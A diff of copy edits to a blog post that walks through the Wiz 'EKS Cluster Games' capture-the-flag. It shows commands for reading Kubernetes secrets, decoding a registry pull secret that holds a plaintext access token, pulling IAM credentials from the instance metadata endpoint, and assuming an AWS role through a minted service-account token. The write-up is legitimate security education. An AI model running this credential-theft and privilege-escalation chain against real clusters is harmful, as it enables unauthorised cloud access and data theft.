@@ -9,17 +9,22 @@ tags:
 layout: layouts/post.njk
 permalink: /eks-cluster-games/
 ---
-CTF challenges [continue](/the-big-iam-challenge/) to be one of my interest for their abilities to show me even more ways how my allegedly "secure" and "solid" infrastructure setup can be access by a malicious actor. This time we're gonna discuss the second in a series of CTF challenges made by [WIZ](https://www.wiz.io/ctf): [EKS Cluster Games](https://eksclustergames.com/).
+CTF challenges [continue](/the-big-iam-challenge/) to be one of my interests for their ability to show me even more ways in which my allegedly "secure" and "solid" infrastructure setup can be accessed by a malicious actor. This time we're gonna discuss the second challenge in a series of CTFs made by [WIZ](https://www.wiz.io/ctf): [EKS Cluster Games](https://eksclustergames.com/).
 
 <!-- more -->
 
 ![image](/assets/eks-cluster-games.webp)
 
 ## Secret Seeker
-> task:
-> Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?
 
-policy:
+::: info Task
+
+    Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?
+
+:::
+
+Kubernetes policy:
+
 ```json
 {
     "secrets": [
@@ -29,9 +34,10 @@ policy:
 }
 ```
 
-For this task we're provided with our given permissions: we can list and read secrets. Okay, let's do exactly that.
+For this task we're provided with the following permissions: we can list and read secrets. Okay, let's do exactly that.
 
-But before diving into kubernetes resources, we have a nice welcome message:
+But before diving into Kubernetes resources, we have a nice welcome message:
+
 ```bash
 Welcome to Wiz EKS Challenge!
 For your convenience, the following directories are persistent across sessions:
@@ -40,13 +46,17 @@ For your convenience, the following directories are persistent across sessions:
 
 Use kubectl to start!
 ```
-All right! Having home directory persistent across sessions means that we can ease our job. Let's start with *the* alias:
+
+All right! Having the home directory persistent across sessions means we can make our job easier. Let's start with *the* alias:
+
 ```bash
 echo 'alias k="kubectl"' >> ~/.bashrc && source ~/.bashrc
 ```
-and now we won't have to enter long `kubectl` ever again (in the scope of this challenge that is.)
+
+And now we won't have to type the long `kubectl` command ever again (in the scope of this challenge, that is.)
 
 Now to the task itself.
+
 ```bash
 root@wiz-eks-challenge:~# k get secret
 NAME         TYPE     DATA   AGE
@@ -56,25 +66,27 @@ apiVersion: v1
 data:
   flag: d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==
 kind: Secret
-metadata:
-  creationTimestamp: "2023-11-01T13:02:08Z"
-  name: log-rotate
-  namespace: challenge1
-  resourceVersion: "277935903"
-  uid: 03f6372c-b728-4c5b-ad28-70d5af8d387c
-type: Opaque
+{...}
 ```
+
 And there is our flag! Let's decode it and see the value:
+
 ```bash
 root@wiz-eks-challenge:~# echo 'd2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==' | base64 -d
 wiz_eks_challenge{omg_over_privileged_secret_access}
 ```
-So far so good. Let's see if the following challenges will be as easy.
-## Registry Hunt
-> task:
-> A thing we learned during our research: always check the container registries.
 
-policy:
+So far so good. This was a breeze. Let's see if the following challenges will be as easy.
+
+## Registry Hunt
+
+::: info Task
+
+    A thing we learned during our research: always check the container registries.
+
+:::
+
+Kubernetes policy:
 
 ```json
 {
@@ -89,6 +101,7 @@ policy:
 ```
 
 With the given policy we can list and get pods, and we can get secrets. But oh bother, we can't actually list secrets! So we will have to somehow find them. Let's start with pods.
+
 ```bash
 root@wiz-eks-challenge:~# k get pods
 NAME                    READY   STATUS    RESTARTS   AGE
@@ -106,7 +119,9 @@ total 12
 -rw-r--r--. 1 nobody nogroup   11 Sep  5 19:45 namespace
 -rw-r--r--. 1 nobody nogroup 1010 Sep  5 19:45 token
 ```
+
 Eh, nothing of interest here. Let's try a different approach.
+
 ```bash
 root@wiz-eks-challenge:~# k get pod database-pod-14f9769b -o yaml
 apiVersion: v1
@@ -118,7 +133,9 @@ spec:
   - name: registry-pull-secrets-16ae8e51
   {...}
 ```
-Booyah! There we have it! A handy dandy `imagePullSecrets` parameter waiting just for us.
+
+Booyah! There we have it! A handy-dandy `imagePullSecrets` parameter waiting just for us.
+
 ```bash
 root@wiz-eks-challenge:~# k get secret registry-pull-secrets-16ae8e51 -o yaml
 apiVersion: v1
@@ -129,16 +146,20 @@ kind: Secret
 root@wiz-eks-challenge:~# k get secret registry-pull-secrets-16ae8e51 -o json | jq -r '.data.".dockerconfigjson"' | base64 -d
 {"auths": {"index.docker.io/v1/": {"auth": "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw=="}}}
 ```
-From `auth` string we can extract the credentials to log in to the registry:
+
+From the `auth` string we can extract the credentials to log in to the registry:
+
 ```bash
 root@wiz-eks-challenge:~# echo -n 'ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==' | base64 -d
 eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo
 root@wiz-eks-challenge:~# crane auth login docker.io -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo
 2025/09/05 19:57:55 logged in via /home/user/.docker/config.json
 ```
+
 Nice! *I'm in!*
 
 Now let's head for that image we're tasked to fetch and dissect.
+
 ```bash
 root@wiz-eks-challenge:~# crane pull docker.io/eksclustergames/base_ext_image@sha256:c3c280fac41084a821ab0a32d16bd21a887141bcf1330e40adf086c0f0c97888 base_ext_image.tar.gzip
 root@wiz-eks-challenge:~# ls -l
@@ -150,7 +171,9 @@ gzip: stdin: not in gzip format
 tar: Child returned status 1
 tar: Error is not recoverable: exiting now
 ```
-Jokes on me here -- the pulled image was not actually a gzipped tar archive, but just a tar archive consisting of several gzipped tar archives. Happens with the best of us!
+
+Joke's on me here -- the pulled image was not actually a gzipped tar archive, but a tar archive consisting of several gzipped tar archives. Happens to the best of us!
+
 ```bash
 root@wiz-eks-challenge:~# mv base_ext_image.tar.gzip base_ext_image.tar
 root@wiz-eks-challenge:~# ls -l
@@ -176,9 +199,11 @@ sys/
 root@wiz-eks-challenge:~# cat flag.txt
 wiz_eks_challenge{always_look_for_imagepullsecrets}
 ```
-And here is the flag! Let's paste it to the task page and...
-Turns out this is the wrong flag! But how? Did I miss something?
+
+And here is the flag! Let's paste it to the task page and... Turns out this is the wrong flag! But how? Did I miss something?
+
 Let's take a look at the image once more:
+
 ```bash
 root@wiz-eks-challenge:~# crane config eksclustergames/base_ext_image:latest | jq
 {
@@ -195,13 +220,21 @@ root@wiz-eks-challenge:~# crane config eksclustergames/base_ext_image:latest | j
   {...}
 }
 ```
-Oh, you! So THIS is the actual flag! I could never.
-## Image Inquisition
-### Task
-A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.
 
-Remember: You are running inside a compromised EKS pod.
-### Policy
+Oh, you! So THIS is the actual flag! I could never.
+
+## Image Inquisition
+
+::: info Task
+
+    A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.
+
+    Remember: You are running inside a compromised EKS pod.
+
+:::
+
+Kubernetes policy:
+
 ```json
 {
     "pods": [
@@ -232,55 +265,7 @@ metadata:
 spec:
   containers:
   - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4
-    imagePullPolicy: IfNotPresent
-    name: accounting-container
-    resources: {}
-    terminationMessagePath: /dev/termination-log
-    terminationMessagePolicy: File
-    volumeMounts:
-    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
-      name: kube-api-access-n7q8h
-      readOnly: true
-  dnsPolicy: ClusterFirst
-  enableServiceLinks: true
-  nodeName: ip-192-168-63-122.us-west-1.compute.internal
-  preemptionPolicy: PreemptLowerPriority
-  priority: 0
-  restartPolicy: Always
-  schedulerName: default-scheduler
-  securityContext: {}
-  serviceAccount: default
-  serviceAccountName: default
-  terminationGracePeriodSeconds: 30
-  tolerations:
-  - effect: NoExecute
-    key: node.kubernetes.io/not-ready
-    operator: Exists
-    tolerationSeconds: 300
-  - effect: NoExecute
-    key: node.kubernetes.io/unreachable
-    operator: Exists
-    tolerationSeconds: 300
-  volumes:
-  - name: kube-api-access-n7q8h
-    projected:
-      defaultMode: 420
-      sources:
-      - serviceAccountToken:
-          expirationSeconds: 3607
-          path: token
-      - configMap:
-          items:
-          - key: ca.crt
-            path: ca.crt
-          name: kube-root-ca.crt
-      - downwardAPI:
-          items:
-          - fieldRef:
-              apiVersion: v1
-              fieldPath: metadata.namespace
-            path: namespace
-[...]
+{...}
 root@wiz-eks-challenge:~# crane config 46681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4
 Error: fetching config: reading image "46681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4": GET https://46681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-579b0b7/manifests/sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4: unexpected status code 401 Unauthorized: Not Authorized
 root@wiz-eks-challenge:~# k exec -ti accounting-pod-acbd5209 -- /bin/bash
@@ -296,8 +281,9 @@ Unable to locate credentials. You can configure credentials by running "aws conf
 root@wiz-eks-challenge:~# crane export 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4 -
 Error: pulling 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4: GET https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-579b0b7/manifests/sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4: unexpected status code 401 Unauthorized: Not Authorized
 ```
-As we see, all the fun stuff is unavailable (expected, but still). Nothing interesting about the pod, no leftover credentials, no access to the registry also.
-Let's dive further. Specifically, let's explore the instance metadata, perhaps we can find something of interest there.
+
+As we see, all the fun stuff is unavailable (expected, but still). Nothing interesting about the pod, no leftover credentials, and no access to the registry either.
+Let's dive further. Specifically, let's explore the instance metadata -- perhaps we can find something of interest there.
 
 ```bash
 root@wiz-eks-challenge:~# curl 169.254.169.254/latest/meta-data/iam/
@@ -308,7 +294,8 @@ eks-challenge-cluster-nodegroup-NodeInstanceRole
 root@wiz-eks-challenge:~# curl 169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
 {"AccessKeyId":"ASIA2AVYNEVMQUHHPZJM","Expiration":"2025-09-05 21:20:11+00:00","SecretAccessKey":"/ktJO622Y5GSAXmqdgv+ySje4QNGRgE+...","SessionToken":"FwoGZXIvYXdzECYaDGJ/..."}
 ```
-Nice! We have session credentials which we can use to authorize in the `awscli`.
+
+Nice! We have session credentials which we can use to authorize the `awscli`.
 
 ```bash
 root@wiz-eks-challenge:~# mkdir -p ~/.aws && cat << EOF > ~/.aws/credentials
@@ -321,21 +308,27 @@ root@wiz-eks-challenge:~# aws ecr describe-registry
 
 An error occurred (AccessDeniedException) when calling the DescribeRegistry operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0bd90a7fe60cdb9f7 is not authorized to perform: ecr:DescribeRegistry on resource: * because no identity-based policy allows the ecr:DescribeRegistry action
 ```
-It seems that our role is limited, after all. But that's okay, in the end we mainly want to focus on the images in the registry, not the registry itself.
+
+It seems that our role is limited, after all. But that's okay; in the end we mainly want to focus on the images in the registry, not the registry itself.
 
 Let's use a neat command to get ECR login credentials.
+
 ```bash
 root@wiz-eks-challenge:~# aws ecr get-login-password
 eyJwYXlsb2FkIjoicjlEOCt4Vnd6N01QWEx5bjN5dWdXTmpoQkFEZnNQZndjU25FQmd6WmRzRUg3T3ZsdURhc[...] # omitted for brevity
 root@wiz-eks-challenge:~# echo -n '[base64-encoded-data]' | base64 -d
-{"payload":"r9D8+xVwz7MPXLyn3yugWNjhBADfsPfwcSnEBgzZdsEH7OvluDarr29d85HrD9gpASQmQQLZxuH4f9gKeR9gRXdJwuOd0Db8Nu2GpelnI+...=","datakey":"AQEBAHijEFXGwF1cipVOacG8qRmJoVBPay8LUUvU8RCVV0XoHwAAAH4wfAYJKoZIhvcNAQcGoG8wbQIBADBoBgkqhkiG9w0BBwEwHgYJYIZIAWUDBAEuMBEEDJJFy4z02QI5mGKA3gIBEIA7fP3drjQNErAUNDNqiuhBce8qTrbi2ril...","version":"2","type":"DATA_KEY","expiration":1757147299}
+{"payload":"r9D8+xVwz7MPXLyn3yugWNjhBADfsPfwcSnEBgzZdsEH7OvluDarr29d85Hr...","datakey":"AQEBAHijEFXGwF1cipVOacG8qRmJoVBPay8LUUvU8RCVV0XoHwAAAH4wfAYJKoZIh...","version":"2","type":"DATA_KEY","expiration":1757147299}
 ```
+
 Great! Several decoding attempts later it was clear to me that this is binary authorization data and I just have to pass it to a login command and not try to decode it all.
+
 ```bash
 root@wiz-eks-challenge:~# aws ecr get-login-password --region us-west-1 | crane auth login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com
 2025/09/05 20:30:48 logged in via /home/user/.docker/config.json
 ```
+
 Now let's finally dissect the image that we're given.
+
 ```bash
 root@wiz-eks-challenge:~# kubectl get pods accounting-pod-acbd5209 -o yaml | grep '\- image:'
   - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4
@@ -350,19 +343,28 @@ root@wiz-eks-challenge:~# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.
 {...}
 }
 ```
-Et voila! And there we have it. Nicely hidden in docker image layer secret we've been looking for.
+
+Et voilà! And there we have it -- the secret we were looking for, nicely hidden in a Docker image layer.
 
 ## Pod Break
-> task:
-> You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?
 
-Policy:
+::: info Task
+
+    You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?
+
+:::
+
+
+Kubernetes policy:
+
 ```json
 {}
 ```
-Oh, this is a fun one. We have no permissions on a kubernetes cluster whatsoever and we have to access service account.
+
+Oh, this is a fun one. We have no permissions on a Kubernetes cluster whatsoever and we have to access a service account.
 
 We can start with the same approach as in a previous task: obtain credentials from the instance metadata.
+
 ```bash
 root@wiz-eks-challenge:~# curl 169.254.169.254/latest/meta-data/iam/security-credentials/
 eks-challenge-cluster-nodegroup-NodeInstanceRole
@@ -386,7 +388,9 @@ root@wiz-eks-challenge:~# aws sts get-caller-identity
     "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0bd90a7fe60cdb9f7"
 }
 ```
-Great! The credentials are obtained. Now, for the next step. With the help of retreived IAM role we can try to get EKS authorization token.
+
+Great! The credentials are obtained. Now, for the next step. With the help of the retrieved IAM role we can try to get an EKS authorization token.
+
 ```bash
 root@wiz-eks-challenge:~# aws eks get-token --cluster-name eks-challenge-cluster
 {
@@ -399,7 +403,9 @@ root@wiz-eks-challenge:~# aws eks get-token --cluster-name eks-challenge-cluster
     }
 }
 ```
+
 All right, the token is here. Let's see what we have available.
+
 ```bash
 root@wiz-eks-challenge:~# TOKEN=$(aws eks get-token --cluster-name=eks-challenge-cluster | jq '.status.token' | sed "s/\"//g")
 root@wiz-eks-challenge:~# kubectl --token=$TOKEN get pods
@@ -415,7 +421,9 @@ Error from server (Forbidden): horizontalpodautoscalers.autoscaling is forbidden
 Error from server (Forbidden): cronjobs.batch is forbidden: User "system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal" cannot list resource "cronjobs" in API group "batch" in the namespace "challenge4"
 Error from server (Forbidden): jobs.batch is forbidden: User "system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal" cannot list resource "jobs" in API group "batch" in the namespace "challenge4"
 ```
-Not so much available. Oh well, let's try to access the basic secret stuff.
+
+Not much is available. Oh well, let's try to access the basic secret stuff.
+
 ```bash
 root@wiz-eks-challenge:~# kubectl --token=$TOKEN get secret
 NAME        TYPE     DATA   AGE
@@ -423,12 +431,19 @@ node-flag   Opaque   1      674d
 root@wiz-eks-challenge:~# kubectl --token=$TOKEN get secret node-flag -o json | jq -r '.data.flag' | base64 -d
 wiz_eks_challenge{only_a_real_pro_can_navigate_IMDS_to_EKS_congrats}
 ```
-Hey, it says we're real pros! That's so nice of them.
-## Container Secrets Infrastructure
-> task:
-> You've successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the s3access-sa service account, and get the flag?
 
-iam policy:
+Hey, it says we're real pros! That's so nice of them.
+
+## Container Secrets Infrastructure
+
+::: info Task
+
+    You've successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the s3access-sa service account, and get the flag?
+
+:::
+
+IAM role policy:
+
 ```json
 {
     "Policy": {
@@ -449,7 +464,9 @@ iam policy:
     }
 }
 ```
-iam trust policy:
+
+IAM trust policy:
+
 ```json
 {
     "Version": "2012-10-17",
@@ -469,7 +486,9 @@ iam trust policy:
     ]
 }
 ```
-k8s permissions:
+
+Kubernetes policy:
+
 ```json
 {
     "secrets": [
@@ -490,7 +509,7 @@ k8s permissions:
 }
 ```
 
-This task looks like an amalgam of all the previous tasks in this challenge. And the policies, apart from giving us access to the desired flag, hint at what we actually can do with our permissions. For example, audience in trust policy is there for a reason. And we're given the ability to create Service Account token not for nothing. (Unless, of course, this is exactly the case and they are meant to pave us off the path -- but we will see that soon enough.)
+This task looks like an amalgam of all the previous tasks in this challenge. The policies, apart from giving us access to the desired flag, hint at what we actually can do with our permissions. For example, the audience in the trust policy is there for a reason. And we're given the ability to create a ServiceAccount token for a reason. (Unless, of course, this is exactly to throw us off the path -- but we will see that soon enough.)
 
 Let's start with credentials.
 
@@ -503,7 +522,7 @@ root@wiz-eks-challenge:~# aws sts get-caller-identity
 }
 ```
 
-We have assumed role for the instance, but it's of no interest to us. Let's try to find another role to assume.
+We have an assumed role for the instance, but it's of no interest to us. Let's try to find another role to assume.
 
 ```bash
 root@wiz-eks-challenge:~# kubectl describe sa
@@ -525,20 +544,20 @@ Annotations:         eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/
 ...
 ```
 
-As we can see, we have 3 Service Accounts available to us. 2 of them have roles we can assume. And only one, it seems, is the role with actual permissions to access the flag.
+As we can see, we have three ServiceAccounts available to us. Two of them have roles we can assume. And only one, it seems, is the role with actual permissions to access the flag.
 
-For the next trick we would want to have a web identity token (JWT), which will allow us to assume the next level role. Let's try to obtain one.
+For the next trick we would want to have a web identity token (JWT), which will allow us to assume the next-level role. Let's try to obtain one.
 
 ```bash
 root@wiz-eks-challenge:~# kubectl create token s3access-sa --audience=sts.amazonaws.com
 error: failed to create token: serviceaccounts "s3access-sa" is forbidden: User "system:node:challenge:ip-192-168-63-122.us-west-1.compute.internal" cannot create resource "serviceaccounts/token" in API group "" in the namespace "challenge5"
 ```
 
-Bummer. But what about another Service Account?
+Bummer. But what about another ServiceAccount?
 
 ```bash
 root@wiz-eks-challenge:~# kubectl create token debug-sa --audience=sts.amazonaws.com
-eyJhbGciOiJSUzI1NiIsImtpZCI6ImRmZjE4OGZjZDg3MTM1OTU3OWZhOWMxMzE5ZjcxNTg0Nzg1NmE3NmMifQ...
+eyJhbGciOiJSUzI1NiIsImtpZCI6ImRmZjE4OGZjZDg3...
 ```
 
 Bingo!
@@ -547,12 +566,12 @@ Bingo!
 root@wiz-eks-challenge:~# aws sts assume-role-with-web-identity \
   --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role \
   --role-session-name HeresJohnny
-  --web-identity-token eyJhbGciOiJSUzI1NiIsImtpZCI6ImRmZjE4OGZjZDg3MTM1OTU3OWZhOWMxMzE5ZjcxNTg0Nzg1NmE3NmMifQ.... \
+  --web-identity-token eyJhbGciOiJSUzI1NiIsImtpZCI6ImRmZjE4OGZjZDg3.... \
 {
     "Credentials": {
         "AccessKeyId": "ASIA2AVYNEVMYGOPTRII",
         "SecretAccessKey": "87W2QkL9e1Mkdj4T0Zf/...",
-        "SessionToken": "IQoJb3JpZ2luX2VjEGQaCXVzLXdlc3QtMSJHMEUCIQCfVepHS05hYgXgg8Eu9YwNC44WuH2+ffuu8NvbxUKQ+wIgdNRKeKMN0N5XgEDPZXzCmRe0nEpFtXtJGuU2XATNoYMqxQQI7f//////////...",
+        "SessionToken": "IQoJb3JpZ2luX2VjEGQaCXVzLXdlc3QtMSJHMEUCIQCfVepHS05hYgXgg8Eu9YwNC44WuH2...",
         "Expiration": "2025-09-30T12:38:48+00:00"
     },
     "SubjectFromWebIdentityToken": "system:serviceaccount:challenge5:debug-sa",
@@ -570,7 +589,7 @@ Almost there! Now, the final stretch:
 ```bash
 root@wiz-eks-challenge:~# export AWS_ACCESS_KEY_ID=ASIA2AVYNEVMQEKAGCGB
 root@wiz-eks-challenge:~# export AWS_SECRET_ACCESS_KEY=87W2QkL9e1Mkdj4T0Zf/...
-root@wiz-eks-challenge:~# export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEGQaCXVzLXdlc3QtMSJHMEUCIQCfVepHS05hYgXgg8Eu9YwNC44WuH2+ffuu8NvbxUKQ+wIgdNRKeKMN0N5XgEDPZXzCmRe0nEpFtXtJGuU2XATNoYMqxQQI7f//////////...
+root@wiz-eks-challenge:~# export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEGQaCXVzLXdlc3QtMSJHMEUCIQCfVepHS05hYgXgg8Eu9YwNC44WuH2...
 root@wiz-eks-challenge:~# aws sts get-caller-identity
 {
     "UserId": "AROA2AVYNEVMZEZ2AFVYI:imcoming",
@@ -581,13 +600,13 @@ root@wiz-eks-challenge:~# aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag - | 
 wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws_exp1oitation_legend}
 ```
 
-And there we have it! We really are an EKS and AWS exploration legends!
+And there we have it! We really are EKS and AWS exploitation legends!
 
 ## Afterword
 
-Yet another complicated and super fun challenge. I was frustrated not understanding where to go as much as I enjoyed finding the breadcrumbs along the way that may point to the next step. Even though the challenge is 2 years old already (as of the moment of writing this article), the lessons taught in the tasks are still very much important to this day. It's never too late to learn something new with regards to information systems security, as well as it's never a bad idea to remember what are the more common mistakes that can be made. Because as simple attack as [SQL Injection](https://owasp.org/Top10/A03_2021-Injection/) is still in to [OWASP TOP 10](https://owasp.org/www-project-top-ten/) Web Application Security Risks even to this day.
+Yet another complicated and super-fun challenge. I was as frustrated by not understanding where to go as I was enjoying finding the breadcrumbs along the way that pointed to the next step. Even though the challenge is already two years old (at the time of writing), the lessons from the tasks are still very relevant today. It's never too late to learn something new about information systems security, and it's never a bad idea to remember common mistakes. Because as simple an attack as [SQL Injection](https://owasp.org/Top10/A03_2021-Injection/) is still in the [OWASP Top 10](https://owasp.org/www-project-top-ten/) Web Application Security Risks to this day.
 
-Stay safe!
+Stay secure!
 
 ---
 
